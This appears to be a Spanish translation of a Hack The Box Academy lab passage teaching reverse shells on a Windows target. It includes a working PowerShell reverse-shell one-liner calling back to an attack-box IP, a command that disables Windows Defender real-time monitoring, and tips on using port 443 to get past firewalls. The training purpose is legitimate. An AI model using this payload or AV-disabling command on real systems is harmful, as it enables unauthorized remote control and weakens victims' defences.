Con una `reverse shell`, la caja de ataque tendrá un listener ejecutándose, y el target necesitará iniciar la conexión.

### Reverse Shell Example

![image](https://academy.hackthebox.com/storage/modules/115/reverseshell.png)

A menudo usaremos este tipo de shell al encontrarnos con sistemas vulnerables porque es probable que un administrador pase por alto las conexiones salientes, dándonos una mejor oportunidad de no ser detectados. La última sección discutió cómo las bind shells dependen de conexiones entrantes permitidas a través del firewall en el lado del servidor. Será mucho más difícil lograr esto en un escenario del mundo real. Como se ve en la imagen de arriba, estamos iniciando un listener para una reverse shell en nuestra caja de ataque y usando algún método (ejemplo: `Unrestricted File Upload`, `Command Injection`, etc.) para forzar al target a iniciar una conexión con nuestra caja de ataque, lo que significa efectivamente que nuestra caja de ataque se convierte en el servidor y el target se convierte en el cliente.

No siempre necesitamos reinventar la rueda cuando se trata de payloads (comandos y código) que pretendemos usar al intentar establecer una reverse shell con un target. Hay herramientas útiles que los veteranos de infosec han reunido para ayudarnos. [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) es un recurso fantástico que contiene una lista de diferentes comandos, códigos e incluso generadores automatizados de reverse shell que podemos usar al practicar o en un compromiso real. Debemos tener en cuenta que muchos administradores están al tanto de repositorios públicos y recursos de código abierto que los pentesters usan comúnmente. Ellos pueden referenciar estos repos como parte de sus consideraciones principales sobre qué esperar de un ataque y ajustar sus controles de seguridad en consecuencia. En algunos casos, puede que necesitemos personalizar un poco nuestros ataques.

Vamos a trabajar de forma práctica con esto para entender mejor estos conceptos.

---

## Hands-on With A Simple Reverse Shell in Windows

Con este tutorial, estableceremos una simple reverse shell utilizando algo de código PowerShell en un target Windows. Iniciemos el target y comencemos.

Podemos iniciar un listener de Netcat en nuestra caja de ataque mientras el target se inicia.

### Server (`attack box`)

```r
sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

Esta vez, con nuestro listener, lo estamos vinculando a un [common port](https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html) (`443`), este puerto usualmente es para conexiones `HTTPS`. Puede que queramos usar puertos comunes como este porque cuando iniciamos la conexión a nuestro listener, queremos asegurarnos de que no se bloquee al salir a través del firewall del OS y a nivel de red. Sería raro ver a cualquier equipo de seguridad bloquear el puerto 443 saliente ya que muchas aplicaciones y organizaciones dependen de HTTPS para acceder a varios sitios web a lo largo del día. Dicho esto, un firewall capaz de inspección profunda de paquetes y visibilidad de la Capa 7 puede detectar y detener una reverse shell saliendo en un puerto común porque examina el contenido de los paquetes de red, no solo la dirección IP y el puerto. La evasión detallada de firewalls está fuera del alcance de este módulo, por lo que solo tocaremos brevemente las técnicas de detección y evasión a lo largo del módulo, así como en la sección dedicada al final.

Una vez que el target Windows se haya iniciado, conectémonos usando RDP.

Netcat se puede usar para iniciar la reverse shell en el lado de Windows, pero debemos tener en cuenta qué aplicaciones están presentes en el sistema ya. Netcat no es nativo de los sistemas Windows, por lo que puede ser poco confiable contar con él como nuestra herramienta en el lado de Windows. Veremos en una sección posterior que para usar Netcat en Windows, debemos transferir un binario de Netcat a un target, lo que puede ser complicado cuando no tenemos capacidades de carga de archivos desde el inicio. Dicho esto, es ideal usar cualquier herramienta que sea nativa (living off the land) al target al que estamos tratando de acceder.

`What applications and shell languages are hosted on the target?`

Esta es una excelente pregunta para hacer cada vez que intentamos establecer una reverse shell. Usemos el command prompt y PowerShell para establecer esta simple reverse shell. Podemos usar una línea de comando estándar de reverse shell de PowerShell para ilustrar este punto.

En el target Windows, abre un command prompt y copia y pega este comando:

### Client (target)

```r
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Nota: Si estamos usando Pwnbox, ten en cuenta que algunos navegadores no funcionan tan bien al usar la función de Clipboard para pegar un comando directamente en la CLI de un target. En estos casos, puede que queramos pegar en Notepad en el target, luego copiar y pegar desde dentro del target.

Por favor, observa detenidamente el comando y considera qué necesitamos cambiar para que esto nos permita establecer una reverse shell con nuestra caja de ataque. Este código de PowerShell también puede llamarse `shell code` o nuestro `payload`. Entregar este payload en el sistema Windows fue bastante sencillo, considerando que tenemos control total del target para fines de demostración. A medida que este módulo avanza, notaremos que la dificultad aumenta en cómo entregamos el payload a los targets.

`What happened when we hit enter in command prompt?`

### Client (target)

```r
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

El software `Windows Defender antivirus` (`AV`) detuvo la ejecución del código. Esto está funcionando exactamente como se pretende, y desde una perspectiva `defensiva`, esto es una `victoria`. Desde un punto de vista ofensivo, hay algunos obstáculos que superar si el AV está habilitado en un sistema al que intentamos conectarnos. Para nuestros propósitos, querremos deshabilitar el antivirus a través de los `Virus & threat protection settings` o usando este comando en una consola PowerShell administrativa (clic derecho, ejecutar como administrador):

### Disable AV

```r
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

Una vez que el AV esté deshabilitado, intenta ejecutar el código nuevamente.

### Server (attack box)

```r
sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

De vuelta en nuestra caja de ataque, deberíamos notar que hemos establecido con éxito una reverse shell. Podemos ver esto por el cambio en el prompt que comienza con `PS` y nuestra capacidad para interactuar con el sistema operativo y el sistema de archivos. Intenta ejecutar algunos comandos estándar de Windows para practicar un poco.

Ahora, pongamos a prueba nuestros conocimientos con algunas preguntas de desafío.